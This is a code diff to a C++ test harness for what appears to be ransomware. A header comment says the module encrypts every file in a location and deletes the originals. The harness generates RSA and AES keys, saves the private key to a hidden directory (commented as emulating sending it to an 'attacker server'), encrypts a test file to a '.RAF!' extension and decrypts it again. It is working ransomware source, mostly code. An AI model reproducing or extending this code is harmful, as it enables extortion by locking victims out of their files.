@@ -1,14 +1,4 @@
 
-//#define ENABLE_MAIN
-
-#ifdef ENABLE_MAIN
-
-#include "..\include\include.hpp"
-#include "CryptoKeyManager.hpp"
-#include "FileEncrypter.hpp"
-#include <iostream>
-#include <chrono>
-
 /* Functionality of this encryption module:
 
 It will encrypt all files in the given location in such a way that for each original file:
@@ -21,6 +11,16 @@ It will encrypt all files in the given location in such a way that for each orig
     7) It will append the encrypted original data to the file created in step 4 (using the function encryptFile()).
     8) It will delete the original file (using the function encryptFile()).
 */
+
+#define ENABLE_PSEUDO_TESTS
+
+#ifdef ENABLE_PSEUDO_TESTS
+
+#include "..\include\include.hpp"
+#include "CryptoKeyManager.hpp"
+#include "FileEncrypter.hpp"
+#include <iostream>
+#include <chrono>
 
 int main(int argc, char* argv[])
 {
@@ -57,7 +57,7 @@ int main(int argc, char* argv[])
     //Save private key to hidden dir (emulate sending private key to attacker server)
     auto userId = utils::getSystemUserName() + utils::genRandomString(6);
     auto fileName = std::string(_("private_")) + userId + _(".pam");
-    if (not keyMgr.sendKeysTo(rsaDir + fileName))
+    if (not keyMgr.sendKeysTo((rsaDir + fileName).c_str()))
     {
         DBG_PRINT("Cannot save private key");
         utils::stopAndExit(EXIT_FAILURE);
@@ -66,12 +66,11 @@ int main(int argc, char* argv[])
     //Destroy private key
     if (not keyMgr.destroyPrivateKey())
     {
-        DBG_PRINT("Cannot destroy private key: %s", keyMgr.getLastError().c_str());
         utils::stopAndExit(EXIT_FAILURE);
     }
 
     //Read private key from hidden dir (emulate receiving private key from attacker server)
-    if (not keyMgr.receivePrivateKeyFrom(rsaDir + fileName))
+    if (not keyMgr.receivePrivateKeyFrom((rsaDir + fileName).c_str()))
     {
         DBG_PRINT("Cannot read private key");
         utils::stopAndExit(EXIT_FAILURE);
@@ -79,53 +78,59 @@ int main(int argc, char* argv[])
 
 #pragma region AES_TEST
 
+    auto printAes = [](const CryptoKeyManager::AESKey& aes)
+    {
+		for (const auto& byte : aes.key)
+			std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)byte;
+	};
+
     //Generate AES key
-    //CryptoKeyManager::AESKey aes;
-    //if (not keyMgr.generateAESKey(&aes))
-    //{
-	//	DBG_PRINT("Cannot generate AES key");
-	//	utils::stopAndExit(EXIT_FAILURE);
-	//}
+    CryptoKeyManager::AESKey aes;
+    if (not keyMgr.generateAESKey(&aes))
+    {
+		DBG_PRINT("Cannot generate AES key");
+		utils::stopAndExit(EXIT_FAILURE);
+	}
 
     //Encrypt AES key
-    //DBG_PRINT("Generated AES [encrypted: %d]: ", aes.isEncrypted());
-    //std::cout << aes << std::endl;
+    DBG_PRINT("Generated AES [encrypted: %d]: ", aes.isEncrypted());
+    printAes(aes);
 
-    // if (not keyMgr.encryptAESKey(&aes))
-    //{
-	//	DBG_PRINT("Cannot encrypt AES key");
-	//	utils::stopAndExit(EXIT_FAILURE);
-	//}
+     if (not keyMgr.encryptAESKey(&aes))
+    {
+		DBG_PRINT("Cannot encrypt AES key");
+		utils::stopAndExit(EXIT_FAILURE);
+	}
 
-    //DBG_PRINT("Encrypted AES [encrypted: %d]: ", aes.isEncrypted());
-    //std::cout << aes << std::endl;
+    DBG_PRINT("Encrypted AES [encrypted: %d]: ", aes.isEncrypted());
+    printAes(aes);
 
     //Decrypt AES key
-    //if (not keyMgr.decryptAESKey(&aes))
-    //{
-    //    DBG_PRINT("Cannot decrypt AES key");
-    //    utils::stopAndExit(EXIT_FAILURE);
-    //}
+    if (not keyMgr.decryptAESKey(&aes))
+    {
+        DBG_PRINT("Cannot decrypt AES key");
+        utils::stopAndExit(EXIT_FAILURE);
+    }
 
-    //DBG_PRINT("Decrypted AES [encrypted: %d]: ", aes.isEncrypted());
-    //std::cout << aes << std::endl;
+    DBG_PRINT("Decrypted AES [encrypted: %d]: ", aes.isEncrypted());
+    printAes(aes);
 
 #pragma endregion AES_TEST
 
     auto& fileEnctrypter = FileEncrypter::getInstance();
-    fileEnctrypter.init(keyMgr);
+    fileEnctrypter.init(&keyMgr);
 
     const char* testFile = "test_file.txt";
     const char* testFileEncrypted = "test_file.txt.RAF!";
 
     std::string sha256;
-    if (fileEnctrypter.computeFileSHA256(rsaDir + testFile, &sha256))
+    if (fileEnctrypter.computeFileSHA256((rsaDir + testFile).c_str(), &sha256))
         DBG_PRINT("SHA256 before encrypting file: %s", sha256.c_str());
 
     auto timerStart = std::chrono::high_resolution_clock::now();
 
     // Encrypt files
-    if (not fileEnctrypter.encryptFile(rsaDir + testFile))
+    if (not fileEnctrypter.encryptFile((rsaDir + testFile).c_str()))
     {
         DBG_PRINT("Cannot encrypt file");
         utils::stopAndExit(EXIT_FAILURE);
@@ -135,7 +140,7 @@ int main(int argc, char* argv[])
     auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(timerEnd - timerStart).count();
     DBG_PRINT("Encryption time: %lld ms", duration);
 
-    if (fileEnctrypter.computeFileSHA256(rsaDir + testFile, &sha256))
+    if (fileEnctrypter.computeFileSHA256((rsaDir + testFile).c_str(), &sha256))
 		DBG_PRINT("SHA256 after encrypting file: %s", sha256.c_str());
 
     system("pause");
@@ -143,7 +148,7 @@ int main(int argc, char* argv[])
     timerStart = std::chrono::high_resolution_clock::now();
 
     // Decrypt file
-    if (not fileEnctrypter.decryptFile(rsaDir + testFileEncrypted))
+    if (not fileEnctrypter.decryptFile((rsaDir + testFileEncrypted).c_str()))
     {
 		DBG_PRINT("Cannot decrypt file");
 		utils::stopAndExit(EXIT_FAILURE);
@@ -153,7 +158,7 @@ int main(int argc, char* argv[])
     duration = std::chrono::duration_cast<std::chrono::milliseconds>(timerEnd - timerStart).count();
     DBG_PRINT("Decryption time: %lld ms", duration);
 
-    if (fileEnctrypter.computeFileSHA256(rsaDir + testFile, &sha256))
+    if (fileEnctrypter.computeFileSHA256((rsaDir + testFile).c_str(), &sha256))
         DBG_PRINT("SHA256 after decrypting file: %s", sha256.c_str());
 
     utils::stopAndExit(EXIT_SUCCESS);
